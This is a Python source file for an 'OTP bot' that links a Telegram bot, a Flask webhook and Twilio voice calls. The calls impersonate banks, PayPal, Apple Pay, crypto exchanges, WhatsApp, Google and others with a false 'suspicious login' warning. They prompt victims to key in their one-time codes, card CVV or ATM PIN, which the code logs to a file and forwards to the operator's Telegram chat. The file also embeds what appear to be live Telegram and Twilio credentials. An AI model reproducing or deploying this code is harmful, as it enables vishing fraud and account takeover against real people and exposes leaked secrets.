import logging
import os
import threading
import requests
import time
from datetime import datetime
from flask import Flask, request
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes, CallbackQueryHandler, MessageHandler, filters
from twilio.rest import Client

# --- CONFIGURACIÓN ---
TELEGRAM_TOKEN = '8555237773:AAHZiG_nqBzGyWshGsXBzCEKnOKmOjxoHLw'
TWILIO_SID = 'AC28c3778e4e9e8a5ed052788c8d791a7b'
TWILIO_TOKEN = '46fa07ac3ba87118c2447abeed7bd6e8'
TWILIO_NUMBER = '+19565313089'
ARCHIVO_LOGS = "codigos_capturados.txt"
# OBTÉN TU ID REAL CON @userinfobot EN TELEGRAM
MI_CHAT_ID = "TU_CHAT_ID_AQUI" 

client = Client(TWILIO_SID, TWILIO_TOKEN)
server = Flask(__name__)

# --- DICCIONARIO MAESTRO (15 MÓDULOS) ---
MODULOS = {
    "bank": {"name": "Bank", "msg_es": "el código de su banca móvil", "msg_en": "your mobile banking code", "digits": 6},
    "paypal": {"name": "PayPal", "msg_es": "el código de seguridad de PayPal", "msg_en": "your PayPal security code", "digits": 6},
    "applepay": {"name": "Apple Pay", "msg_es": "el código de Apple Pay", "msg_en": "your Apple Pay code", "digits": 6},
    "amazon": {"name": "Amazon", "msg_es": "el código de aprobación de Amazon", "msg_en": "your Amazon approval code", "digits": 6},
    "facebook": {"name": "Facebook", "msg_es": "el código de recuperación de Facebook", "msg_en": "your Facebook code", "digits": 6},
    "whatsapp": {"name": "WhatsApp", "msg_es": "el código de verificación de WhatsApp", "msg_en": "your WhatsApp code", "digits": 6},
    "instagram": {"name": "Instagram", "msg_es": "el código de acceso de Instagram", "msg_en": "your Instagram code", "digits": 6},
    "coinbase": {"name": "Coinbase", "msg_es": "el código de 2 pasos de Coinbase", "msg_en": "your Coinbase code", "digits": 6},
    "binance": {"name": "Binance", "msg_es": "el código de retiro de Binance", "msg_en": "your Binance withdrawal code", "digits": 6},
    "crypto": {"name": "Crypto.com", "msg_es": "el código de transferencia", "msg_en": "your transfer code", "digits": 6},
    "cashapp": {"name": "CashApp", "msg_es": "su código de inicio de sesión", "msg_en": "your login code", "digits": 6},
    "venmo": {"name": "Venmo", "msg_es": "el código de verificación de Venmo", "msg_en": "your Venmo code", "digits": 6},
    "google": {"name": "Google", "msg_es": "el código de verificación de Google", "msg_en": "your Google code", "digits": 6},
    "cvv": {"name": "CVV", "msg_es": "los 3 dígitos de seguridad al reverso de su tarjeta", "msg_en": "the 3 digits on the back of your card", "digits": 3},
    "pin": {"name": "PIN", "msg_es": "su clave de cajero de 4 dígitos", "msg_en": "your 4 digit ATM pin", "digits": 4}
}

# --- DETECCIÓN AUTOMÁTICA DE NGROK ---
def get_ngrok_url():
    try:
        response = requests.get("http://localhost:4040/api/tunnels", timeout=2)
        data = response.json()
        for tunnel in data['tunnels']:
            if tunnel['proto'] == 'https':
                return tunnel['public_url']
        return None
    except: return None

# --- WEBHOOK: LÓGICA DE CAPTURA Y REINTENTO ---
@server.route('/otp-recibido', methods=['POST'])
def otp_recibido():
    digits = request.form.get('Digits')
    target = request.form.get('To')
    mod_key = request.args.get('mod', 'bank')
    mod = MODULOS.get(mod_key)
    
    is_us = target.startswith("+1")
    lang, voice = ("en-US", "Polly.Joanna") if is_us else ("es-MX", "alice")

    if digits and len(digits) >= int(mod['digits']):
        # ÉXITO
        fecha = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(ARCHIVO_LOGS, "a") as f:
            f.write(f"[{fecha}] {mod['name']} | Target: {target} | OTP: {digits}\n")
        
        requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", 
                      data={"chat_id": MI_CHAT_ID, "text": f"✅ **¡CÓDIGO CAPTURADO!**\n📱 Target: `{target}`\n🛠 Mod: `{mod['name']}`\n🔑 OTP: `{digits}`", "parse_mode": "Markdown"})
        
        final_msg = "Thank you, identity verified." if is_us else "Gracias, identidad verificada correctamente."
        return f"<Response><Say language='{lang}' voice='{voice}'>{final_msg}</Say><Hangup/></Response>"
    
    else:
        # REINTENTO (Si no puso nada o puso menos dígitos)
        webhook_base = get_ngrok_url()
        reintentar_url = f"{webhook_base}/otp-recibido?mod={mod_key}"
        error_msg = "Invalid code. Please try again." if is_us else "El código es incorrecto. Intente de nuevo."
        instr = f"Enter {mod['msg_en']}" if is_us else f"Ingrese {mod['msg_es']}"
        
        return f"""
        <Response>
            <Say language='{lang}' voice='{voice}'>{error_msg}</Say>
            <Gather action="{reintentar_url}" numDigits="{mod['digits']}" timeout="10">
                <Say language='{lang}' voice='{voice}'>{instr}</Say>
            </Gather>
            <Hangup/>
        </Response>
        """

# --- BOT DE TELEGRAM ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = []
    keys = list(MODULOS.keys())
    for i in range(0, len(keys), 2):
        row = [InlineKeyboardButton(MODULOS[keys[i]]["name"], callback_data=keys[i])]
        if i+1 < len(keys): row.append(InlineKeyboardButton(MODULOS[keys[i+1]]["name"], callback_data=keys[i+1]))
        keyboard.append(row)
    keyboard.append([InlineKeyboardButton("📄 Descargar Logs", callback_data='logs')])
    await update.message.reply_text("🔥 **SUPREME BOT v5.1**\nSelecciona el módulo:", reply_markup=InlineKeyboardMarkup(keyboard))

async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if query.data == 'logs':
        if os.path.exists(ARCHIVO_LOGS): await query.message.reply_document(document=open(ARCHIVO_LOGS, 'rb'))
        return
    context.user_data['active_module'] = query.data
    await query.message.reply_text(f"🎯 Módulo **{query.data.upper()}** activo.\nEnvía el número (+...):")

async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    target = update.message.text
    mod_key = context.user_data.get('active_module')
    webhook_base = get_ngrok_url()
    
    if not mod_key or not target.startswith('+') or not webhook_base:
        await update.message.reply_text("❌ Error: Verifica Ngrok y selecciona un módulo.")
        return

    mod = MODULOS[mod_key]
    url_final = f"{webhook_base}/otp-recibido?mod={mod_key}"
    is_us = target.startswith("+1")
    lang, voice = ("en-US", "Polly.Joanna") if is_us else ("es-MX", "alice")
    
    intro = f"Security alert from {mod['name']}. We detected a suspicious login." if is_us else f"Alerta de seguridad de {mod['name']}. Detectamos un inicio de sesión inusual."
    instr = f"To block this request, please enter {mod['msg_en']}." if is_us else f"Para bloquear esta solicitud, ingrese {mod['msg_es']}."

    twiml = f"""
    <Response>
        <Say language='{lang}' voice='{voice}'>{intro}</Say>
        <Play>http://com.twilio.music.classical.s3.amazonaws.com/ClockworkVaudeville.mp3</Play>
        <Gather action="{url_final}" numDigits="{mod['digits']}" timeout="15">
            <Say language='{lang}' voice='{voice}'>{instr}</Say>
        </Gather>
    </Response>
    """
    client.calls.create(twiml=twiml, to=target, from_=TWILIO_NUMBER, machine_detection='Enable')
    await update.message.reply_text(f"🚀 Llamando a `{target}`...")

# --- MAIN ---
def main():
    threading.Thread(target=lambda: server.run(host='0.0.0.0', port=5000, use_reloader=False), daemon=True).start()
    bot = Application.builder().token(TELEGRAM_TOKEN).build()
    bot.add_handler(CommandHandler("start", start))
    bot.add_handler(CallbackQueryHandler(callback_handler))
    bot.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    print("🚀 SUPREME BOT ONLINE")
    bot.run_polling()

if __name__ == "__main__":
    main()
